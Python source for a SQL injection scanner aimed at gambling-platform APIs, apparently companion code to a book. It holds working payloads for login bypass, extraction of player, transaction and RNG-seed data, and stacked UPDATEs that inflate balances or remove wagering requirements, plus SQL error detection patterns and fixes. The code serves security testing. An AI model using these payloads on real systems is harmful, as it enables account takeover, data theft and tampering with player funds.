#!/usr/bin/env python3
# Companion code for "The Backend of Luck" - Chapter 42, War Stories.
# https://thebackendofluck.com | https://github.com/thebackendofluck/book
# SPDX-License-Identifier: Apache-2.0
#
# FOR TESTING AND EVALUATION ONLY. NOT FOR PRODUCTION USE.
# Published to demonstrate the patterns explained in the book. This code is
# not certified for real-money gaming: operating a gambling platform requires
# your own licence, independent test-lab certification (GLI, eCOGRA or
# equivalent) and regulator approval.

"""
SQL Injection Detection for Gambling Platform API Endpoints
==============================================================

Scans API endpoints for SQL injection vulnerabilities using common
iGaming-specific payloads targeting player accounts, transactions,
game history, and bonus systems.

Usage:
    python sql_injection_scanner.py --target http://localhost:8080 --scan
    python sql_injection_scanner.py --target http://localhost:8080 --endpoints endpoints.json
    python sql_injection_scanner.py --payloads --category auth
"""

import json
import logging
import argparse
import time
import re
from dataclasses import dataclass, field
from datetime import datetime
from typing import Optional
from urllib.parse import urlencode, quote

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger(__name__)

# Note: In production, use libraries like `requests`. This uses urllib for zero dependencies.
try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False
    import urllib.request
    import urllib.error


@dataclass
class SQLiPayload:
    id: str
    category: str       # auth, search, numeric, union, blind, time_based
    payload: str
    description: str
    detection_patterns: list = field(default_factory=list)
    severity: str = "high"  # critical, high, medium, low
    gambling_context: str = ""


@dataclass
class Endpoint:
    path: str
    method: str = "GET"
    params: dict = field(default_factory=dict)
    headers: dict = field(default_factory=dict)
    body: dict = field(default_factory=dict)
    auth_required: bool = False
    description: str = ""


@dataclass
class ScanResult:
    endpoint: str
    method: str
    parameter: str
    payload_id: str
    payload: str
    vulnerable: bool
    evidence: str = ""
    severity: str = "high"
    response_code: int = 0
    response_time_ms: float = 0
    recommendation: str = ""


# ---------------------------------------------------------------------------
# iGaming-specific SQL injection payloads
# ---------------------------------------------------------------------------

PAYLOADS = [
    # Authentication bypass
    SQLiPayload("AUTH-001", "auth", "' OR '1'='1' --", "Classic OR-based auth bypass",
                ["Welcome", "Dashboard", "token", "session"], "critical",
                "Player login form bypass"),
    SQLiPayload("AUTH-002", "auth", "admin'--", "Comment-based auth bypass",
                ["admin", "Welcome", "token"], "critical", "Admin panel login"),
    SQLiPayload("AUTH-003", "auth", "' OR 1=1 LIMIT 1 --", "Auth bypass with limit",
                ["token", "session", "player_id"], "critical", "Login endpoint"),
    SQLiPayload("AUTH-004", "auth", "') OR ('1'='1", "Parenthetical auth bypass",
                ["token", "session"], "critical", "Login with grouped conditions"),

    # Player account manipulation
    SQLiPayload("PLAYER-001", "search", "' UNION SELECT id,username,balance,email FROM players--",
                "Player data extraction via UNION",
                ["@", "balance", "player"], "critical",
                "Player search/lookup exposing other accounts"),
    SQLiPayload("PLAYER-002", "search", "' OR player_id != player_id --",
                "Accessing other player records",
                ["player_id", "balance"], "critical",
                "Player profile endpoint"),

    # Transaction/financial injection
    SQLiPayload("TXN-001", "numeric", "1; UPDATE player_wallets SET balance=999999 WHERE player_id=1--",
                "Balance manipulation via stacked query",
                ["error", "syntax", "UPDATE"], "critical",
                "Balance inquiry or transaction endpoint"),
    SQLiPayload("TXN-002", "search",
                "' UNION SELECT id,amount,status,player_id FROM transactions WHERE amount>10000--",
                "High-value transaction data extraction",
                ["amount", "transaction", "10000"], "critical",
                "Transaction history endpoint"),

    # Game history
    SQLiPayload("GAME-001", "search",
                "' UNION SELECT game_id,bet_amount,win_amount,rng_seed FROM game_rounds--",
                "Game round data extraction including RNG seeds",
                ["rng", "seed", "game_round"], "critical",
                "Game history endpoint — RNG seed exposure"),

    # Bonus system
    SQLiPayload("BONUS-001", "search",
                "' OR bonus_code IS NOT NULL --",
                "Bonus code enumeration",
                ["bonus", "code", "promo"], "high",
                "Bonus redemption endpoint"),
    SQLiPayload("BONUS-002", "numeric",
                "1; UPDATE bonuses SET wagering_requirement=0 WHERE player_id=1--",
                "Wagering requirement manipulation",
                ["error", "syntax", "wagering"], "critical",
                "Bonus status check endpoint"),

    # Blind SQL injection
    SQLiPayload("BLIND-001", "blind", "' AND 1=1 --", "Boolean-based blind (true condition)",
                [], "high", "Any endpoint returning different responses"),
    SQLiPayload("BLIND-002", "blind", "' AND 1=2 --", "Boolean-based blind (false condition)",
                [], "high", "Compare response with BLIND-001"),

    # Time-based blind
    SQLiPayload("TIME-001", "time_based", "' AND SLEEP(3) --",
                "Time-based blind injection (MySQL)",
                [], "high", "Detectable by response time >3s"),
    SQLiPayload("TIME-002", "time_based", "'; WAITFOR DELAY '0:0:3' --",
                "Time-based blind injection (MSSQL)",
                [], "high", "Detectable by response time >3s"),
    SQLiPayload("TIME-003", "time_based", "' AND pg_sleep(3) --",
                "Time-based blind injection (PostgreSQL)",
                [], "high", "Detectable by response time >3s"),

    # Error-based
    SQLiPayload("ERR-001", "error", "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION())) --",
                "Error-based version extraction (MySQL)",
                ["XPATH", "extractvalue", "version", "MariaDB", "MySQL"], "high"),
    SQLiPayload("ERR-002", "error", "' AND CAST(version() AS int) --",
                "Error-based version extraction (PostgreSQL)",
                ["ERROR", "invalid input", "PostgreSQL"], "high"),
]

# Detection patterns for SQL errors in responses
SQL_ERROR_PATTERNS = [
    r"SQL syntax.*MySQL", r"Warning.*mysql_", r"MySQLSyntaxErrorException",
    r"valid MySQL result", r"check the manual that corresponds to your MySQL",
    r"PostgreSQL.*ERROR", r"pg_query\(\)", r"PSQLException",
    r"ORA-\d{5}", r"Oracle.*Driver", r"quoted string not properly terminated",
    r"Microsoft.*ODBC", r"MSSQL.*Driver", r"SQL Server.*Driver",
    r"SQLite.*error", r"sqlite3\.OperationalError",
    r"Unclosed quotation mark", r"You have an error in your SQL syntax",
    r"SQLSTATE\[", r"syntax error at or near",
    r"unterminated string", r"invalid input syntax for",
]

# iGaming-specific endpoints to test
DEFAULT_ENDPOINTS = [
    Endpoint("/api/v1/auth/login", "POST", body={"username": "INJECT", "password": "INJECT"},
             description="Player login"),
    Endpoint("/api/v1/players/search", "GET", params={"q": "INJECT"},
             description="Player search", auth_required=True),
    Endpoint("/api/v1/players/{id}/balance", "GET", params={"player_id": "INJECT"},
             description="Balance inquiry", auth_required=True),
    Endpoint("/api/v1/transactions", "GET", params={"player_id": "INJECT", "status": "INJECT"},
             description="Transaction history", auth_required=True),
    Endpoint("/api/v1/games/history", "GET", params={"player_id": "INJECT", "game_id": "INJECT"},
             description="Game history", auth_required=True),
    Endpoint("/api/v1/bonuses/redeem", "POST", body={"code": "INJECT"},
             description="Bonus redemption", auth_required=True),
    Endpoint("/api/v1/support/search", "GET", params={"query": "INJECT"},
             description="Support ticket search", auth_required=True),
    Endpoint("/api/v1/reports/revenue", "GET", params={"date_from": "INJECT", "date_to": "INJECT"},
             description="Revenue report (admin)", auth_required=True),
]


# ---------------------------------------------------------------------------
# Scanner engine
# ---------------------------------------------------------------------------

class SQLInjectionScanner:
    """SQL injection scanner for iGaming API endpoints."""

    def __init__(self, base_url: str, auth_token: Optional[str] = None,
                 timeout: float = 10, time_threshold_ms: float = 2500):
        self.base_url = base_url.rstrip("/")
        self.auth_token = auth_token
        self.timeout = timeout
        self.time_threshold_ms = time_threshold_ms
        self.results: list[ScanResult] = []

    def scan_endpoint(self, endpoint: Endpoint, payloads: Optional[list] = None) -> list[ScanResult]:
        """Scan a single endpoint with all applicable payloads."""
        if payloads is None:
            payloads = PAYLOADS
        results = []

        # Identify injectable parameters
        injectable_params = {}
        for k, v in endpoint.params.items():
            if v == "INJECT":
                injectable_params[k] = "param"
        for k, v in endpoint.body.items():
            if v == "INJECT":
                injectable_params[k] = "body"

        for param_name, param_loc in injectable_params.items():
            # Get baseline response
            baseline = self._send_request(endpoint, param_name, "normal_value", param_loc)

            for payload_def in payloads:
                result = self._test_payload(endpoint, param_name, param_loc, payload_def, baseline)
                results.append(result)
                self.results.append(result)

        return results

    def _test_payload(self, endpoint: Endpoint, param_name: str, param_loc: str,
                      payload_def: SQLiPayload, baseline: Optional[dict]) -> ScanResult:
        """Test a single payload against a parameter."""
        response = self._send_request(endpoint, param_name, payload_def.payload, param_loc)

        vulnerable = False
        evidence = ""

        if response:
            body = response.get("body", "")

            # Check for SQL error patterns
            for pattern in SQL_ERROR_PATTERNS:
                match = re.search(pattern, body, re.IGNORECASE)
                if match:
                    vulnerable = True
                    evidence = f"SQL error in response: {match.group()}"
                    break

            # Check for payload-specific detection patterns
            if not vulnerable:
                for det_pattern in payload_def.detection_patterns:
                    if det_pattern.lower() in body.lower():
                        vulnerable = True
                        evidence = f"Detection pattern matched: '{det_pattern}'"
                        break

            # Time-based detection
            if payload_def.category == "time_based":
                if response.get("time_ms", 0) > self.time_threshold_ms:
                    vulnerable = True
                    evidence = f"Response time {response['time_ms']:.0f}ms > threshold {self.time_threshold_ms}ms"

            # Boolean-based blind detection (compare with baseline)
            if payload_def.category == "blind" and baseline:
                if response.get("status") != baseline.get("status"):
                    evidence = f"Different status code: {response.get('status')} vs baseline {baseline.get('status')}"
                elif len(body) != len(baseline.get("body", "")):
                    size_diff = abs(len(body) - len(baseline.get("body", "")))
                    if size_diff > 50:
                        vulnerable = True
                        evidence = f"Response size differs by {size_diff} bytes (possible blind SQLi)"

        rec = "Use parameterized queries (prepared statements). Never concatenate user input into SQL."
        if payload_def.category == "auth":
            rec += " Implement rate limiting and account lockout on login endpoints."
        elif "RNG" in payload_def.gambling_context or "seed" in payload_def.payload.lower():
            rec += " CRITICAL: RNG seeds must never be stored in or queryable from player-facing databases."

        return ScanResult(
            endpoint=endpoint.path,
            method=endpoint.method,
            parameter=param_name,
            payload_id=payload_def.id,
            payload=payload_def.payload,
            vulnerable=vulnerable,
            evidence=evidence,
            severity=payload_def.severity if vulnerable else "info",
            response_code=response.get("status", 0) if response else 0,
            response_time_ms=response.get("time_ms", 0) if response else 0,
            recommendation=rec,
        )

    def _send_request(self, endpoint: Endpoint, param_name: str,
                      value: str, param_loc: str) -> Optional[dict]:
        """Send HTTP request (simulated if target unavailable)."""
        url = f"{self.base_url}{endpoint.path}"

        # Build params/body with injection
        params = dict(endpoint.params)
        body = dict(endpoint.body)
        if param_loc == "param":
            params[param_name] = value
        else:
            body[param_name] = value

        headers = dict(endpoint.headers)
        if self.auth_token:
            headers["Authorization"] = f"Bearer {self.auth_token}"

        if endpoint.method == "GET" and params:
            url += "?" + urlencode({k: v for k, v in params.items() if v != "INJECT"})

        start = time.time()
        try:
            if HAS_REQUESTS:
                if endpoint.method == "POST":
                    resp = requests.post(url, json=body, headers=headers, timeout=self.timeout)
                else:
                    resp = requests.get(url, headers=headers, timeout=self.timeout)
                return {
                    "status": resp.status_code,
                    "body": resp.text[:5000],
                    "time_ms": (time.time() - start) * 1000,
                }
            else:
                req = urllib.request.Request(url, headers=headers)
                if endpoint.method == "POST":
                    req.data = json.dumps(body).encode()
                    req.add_header("Content-Type", "application/json")
                resp = urllib.request.urlopen(req, timeout=self.timeout)
                return {
                    "status": resp.status,
                    "body": resp.read().decode()[:5000],
                    "time_ms": (time.time() - start) * 1000,
                }
        except Exception:
            return {"status": 0, "body": "", "time_ms": (time.time() - start) * 1000}

    def generate_report(self) -> dict:
        """Generate scan report."""
        vulns = [r for r in self.results if r.vulnerable]
        by_severity = {"critical": 0, "high": 0, "medium": 0, "low": 0}
        for v in vulns:
            by_severity[v.severity] = by_severity.get(v.severity, 0) + 1

        return {
            "scan_date": datetime.utcnow().isoformat(),  # ty:ignore[deprecated]
            "target": self.base_url,
            "total_tests": len(self.results),
            "vulnerabilities_found": len(vulns),
            "by_severity": by_severity,
            "risk_level": "critical" if by_severity["critical"] > 0
                          else "high" if by_severity["high"] > 0
                          else "medium" if by_severity["medium"] > 0
                          else "low" if vulns else "clean",
            "vulnerabilities": [{
                "endpoint": v.endpoint, "parameter": v.parameter,
                "payload_id": v.payload_id, "severity": v.severity,
                "evidence": v.evidence, "recommendation": v.recommendation,
            } for v in vulns],
            "recommendations": [
                "Use parameterized queries / prepared statements for ALL database queries",
                "Implement input validation with allowlists (not denylists)",
                "Use ORM frameworks that prevent raw SQL injection",
                "Enable WAF rules for SQL injection detection",
                "Implement database-level least privilege (read-only for queries)",
                "Never expose RNG seeds or internal game state in player-facing APIs",
                "Log and alert on SQL error responses to detect scanning attempts",
                "Implement rate limiting on all API endpoints",
            ],
        }


def main():
    parser = argparse.ArgumentParser(description="iGaming SQL Injection Scanner")
    parser.add_argument("--target", type=str, default="http://localhost:8080", help="Target base URL")
    parser.add_argument("--scan", action="store_true", help="Run full scan")
    parser.add_argument("--payloads", action="store_true", help="List all payloads")
    parser.add_argument("--category", type=str, help="Filter payloads by category")
    parser.add_argument("--endpoints", action="store_true", help="List default endpoints")
    parser.add_argument("--format", choices=["json", "text"], default="text")
    args = parser.parse_args()

    if args.payloads:
        for p in PAYLOADS:
            if args.category and p.category != args.category:
                continue
            print(f"  {p.id:12s} [{p.severity:8s}] {p.category:12s} {p.description}")
            print(f"               Payload: {p.payload[:80]}")
            if p.gambling_context:
                print(f"               Context: {p.gambling_context}")
            print()
        return

    if args.endpoints:
        for ep in DEFAULT_ENDPOINTS:
            print(f"  {ep.method:6s} {ep.path:40s} {ep.description}")
        return

    if args.scan:
        scanner = SQLInjectionScanner(args.target)
        print(f"\n=== SQL Injection Scan: {args.target} ===\n")
        for ep in DEFAULT_ENDPOINTS:
            print(f"  Scanning {ep.method} {ep.path}...")
            scanner.scan_endpoint(ep)
        report = scanner.generate_report()
        print(json.dumps(report, indent=2))
        return

    print("Usage:")
    print("  python sql_injection_scanner.py --payloads")
    print("  python sql_injection_scanner.py --scan --target http://localhost:8080")
    print("  python sql_injection_scanner.py --endpoints")


if __name__ == "__main__":
    main()
